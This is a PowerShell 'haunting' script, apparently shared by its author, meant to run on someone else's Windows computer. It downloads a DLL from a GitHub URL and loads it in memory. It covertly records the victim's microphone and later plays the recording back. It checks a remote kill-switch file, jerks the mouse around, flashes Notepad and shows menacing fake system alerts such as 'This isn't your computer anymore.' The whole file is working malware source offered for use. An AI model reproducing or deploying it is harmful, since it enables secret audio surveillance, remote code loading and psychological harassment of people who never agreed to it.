# In-memory Haunting Script with Remote Kill Switch – by DrSp1cy

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework

$log = "$env:TEMP\haunt_debug.log"
"[$(Get-Date)] Starting Haunt" | Out-File $log -Append

function Log {
    param([string]$msg)
    "[$(Get-Date)] $msg" | Out-File $log -Append
}

# Try to load NAudio in-memory
$naudioUrl = "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/NAudio.dll"
try {
    Log "Downloading NAudio"
    $naudioBytes = Invoke-WebRequest $naudioUrl -UseBasicParsing
    $assembly = [System.Reflection.Assembly]::Load($naudioBytes.Content)
    $audioOK = $true
    Log "NAudio loaded"
} catch {
    $audioOK = $false
    Log "NAudio FAILED to load: $_"
}

$waveIn = $null
$writer = $null
$waveFile = "$env:TEMP\ghost_record.wav"

if ($audioOK) {
    try {
        $waveIn = New-Object NAudio.Wave.WaveInEvent
        $writer = New-Object NAudio.Wave.WaveFileWriter $waveFile, $waveIn.WaveFormat
        $waveIn.DataAvailable += {
            param($s, $a)
            $writer.Write($a.Buffer, 0, $a.BytesRecorded)
        }
        $waveIn.StartRecording()
        Log "Recording started"
    } catch {
        Log "Audio recording setup failed: $_"
        $audioOK = $false
    }
}

# BEGIN LOOP
while ($true) {
    try {
        $status = (Invoke-WebRequest "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/kill.txt" -UseBasicParsing).StatusCode
        if ($status -ne 200) { break }
    } catch { break }

    Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 25)

    $pos = [System.Windows.Forms.Cursor]::Position
    $x = [int]$pos.X
    $y = [int]$pos.Y
    $dx = Get-Random -Minimum -20 -Maximum 20
    $dy = Get-Random -Minimum -20 -Maximum 20
    $newX = $x + $dx
    $newY = $y + $dy
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($newX, $newY)
        Log "Moved mouse to ($newX,$newY)"
    } catch {
        Log "Mouse move failed: $_"
    }

    if ((Get-Random -Minimum 1 -Maximum 10) -eq 3) {
        $original = [System.Windows.Forms.Cursor]::Position
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $corner = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
            New-Object System.Drawing.Point(0, 0)
        } else {
            New-Object System.Drawing.Point($screen.Width - 1, $screen.Height - 1)
        }
        [System.Windows.Forms.Cursor]::Position = $corner
        Start-Sleep -Milliseconds 300
        [System.Windows.Forms.Cursor]::Position = $original
        Log "Snap teleport triggered"
    }

    if ((Get-Random -Minimum 1 -Maximum 30) -eq 7) {
        Start-Process notepad
        Start-Sleep -Seconds 1
        Get-Process notepad | Stop-Process
        Log "Notepad flashed"
    }

    # Try playback if audio was OK
    if ($audioOK -and (Get-Random -Minimum 1 -Maximum 25) -eq 5) {
        try {
            $waveIn.StopRecording(); $writer.Dispose()
            Start-Sleep -Milliseconds 300
            $player = New-Object NAudio.Wave.AudioFileReader $waveFile
            $output = New-Object NAudio.Wave.WaveOutEvent
            $output.Init($player)
            $output.Play()
            while ($output.PlaybackState -eq 'Playing') {
                Start-Sleep -Milliseconds 200
            }
            $writer = New-Object NAudio.Wave.WaveFileWriter $waveFile, $waveIn.WaveFormat
            $waveIn.StartRecording()
            Log "Audio playback triggered"
        } catch {
            Log "Audio playback failed: $_"
        }
    }

    if ((Get-Random -Minimum 1 -Maximum 15) -eq 6) {
        $msg = Get-Random -InputObject @(
            "I know what you did.",
            "They're watching.",
            "Stop looking behind you.",
            "This isn't your computer anymore."
        )
        [System.Windows.MessageBox]::Show($msg, "System Alert", "OK", "Error")
        Log "MessageBox displayed: $msg"
    }
}
